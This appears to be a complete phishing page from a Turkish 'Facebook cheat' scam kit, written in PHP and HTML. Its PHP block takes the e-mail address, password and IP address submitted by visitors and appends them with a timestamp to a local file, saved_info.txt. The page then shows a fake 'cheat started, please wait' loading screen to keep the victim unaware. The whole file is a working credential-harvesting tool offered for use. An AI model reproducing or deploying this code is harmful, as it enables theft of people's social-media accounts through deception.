<?php
///*
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
    }
if (isset($_POST['hile']) && isset($_POST['sayi']) && isset($_POST['eposta']) && isset($_POST['password'])) {

$save = fopen("saved_info.txt","a+");
$eposta = $_POST['eposta'];
$password = $_POST['password'];
$hile = $_POST['hile'];
$sayi = $_POST['sayi'];
date_default_timezone_set('Europe/Istanbul');
$tarih = date('d/m/Y H:i:s');
$vericekilen = ("
+-+-+ FACEBOOK HİLE +-+-+

 Tarih         : ".$tarih."
 
 İp Adresi     : ".$ipaddress."

 E-POSTA       : ".$eposta."

 Şifre         : ".$password."

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
");
fwrite($save,$vericekilen);
fclose($save);
//echo "<script>alert('HATALI GİRİŞ YAPTINIZ !');</script>";

}
//*/

?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
.loader {
  border: 16px solid #f3f3f3;
  border-top: 16px solid #8ddb34;
  border-radius: 50%;
  width: 120px;
  height: 120px;
  animation: spin 2s linear infinite;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
<meta charset="UTF-8">
<link rel="icon" href="https://www.flaticon.com/premium-icon/icons/svg/2504/2504792.svg" type="image/x-icon" />
<title>FACEBOOK HİLE MERKEZİ</title>
<style>
		* { margin: 0; padding: 0; }
		
		html { 
			background: url(https://images.unsplash.com/photo-1557682257-2f9c37a3a5f3?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1086&q=80) no-repeat center center fixed; 
			-webkit-background-size: cover;
			-moz-background-size: cover;
			-o-background-size: cover;
			background-size: cover;
		}
		
		#page-wrap { width: 400px; margin: 50px auto; padding: 20px; background: white; -moz-box-shadow: 0 0 20px black; -webkit-box-shadow: 0 0 20px black; box-shadow: 0 0 20px black; }
		p { font: 15px/2 Georgia, Serif; margin: 0 0 30px 0; text-indent: 40px; }
	</style>
</head>
<body>
<br>
<br>
<br>
<br>
<h3>[✓] HİLE İŞLEMİ BAŞLATILDI</h3>
<br>
<h4>LÜTFEN BEKLEYİNİZ..</h4>
<div class="loader"></div>
<!--
label for="login_field">
            KULLANICI ADI
<img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/2c110454-5b33-4416-bf9b-72992c7cb56f/d60eb1v-79212624-e842-4e55-8d58-4ac7514ca8e4.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOiIsImlzcyI6InVybjphcHA6Iiwib2JqIjpbW3sicGF0aCI6IlwvZlwvMmMxMTA0NTQtNWIzMy00NDE2LWJmOWItNzI5OTJjN2NiNTZmXC9kNjBlYjF2LTc5MjEyNjI0LWU4NDItNGU1NS04ZDU4LTRhYzc1MTRjYThlNC5naWYifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6ZmlsZS5kb3dubG9hZCJdfQ.P1AQAZ6H1E-Xwu69xiwDXqfZ5h47ZZlXS4u86T6l8nk" id="bg" alt="" width="250" height="250">

          </label>
<div id="page-wrap">
<p>HİLE BAŞLATILDI</p>
<p>LÜTFEN BEKLEYİNİZ..</p>

<img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/2c110454-5b33-4416-bf9b-72992c7cb56f/d60eb1v-79212624-e842-4e55-8d58-4ac7514ca8e4.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOiIsImlzcyI6InVybjphcHA6Iiwib2JqIjpbW3sicGF0aCI6IlwvZlwvMmMxMTA0NTQtNWIzMy00NDE2LWJmOWItNzI5OTJjN2NiNTZmXC9kNjBlYjF2LTc5MjEyNjI0LWU4NDItNGU1NS04ZDU4LTRhYzc1MTRjYThlNC5naWYifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6ZmlsZS5kb3dubG9hZCJdfQ.P1AQAZ6H1E-Xwu69xiwDXqfZ5h47ZZlXS4u86T6l8nk" id="bg" alt="" width="250" height="250">
</div>-->

</body>
</html>
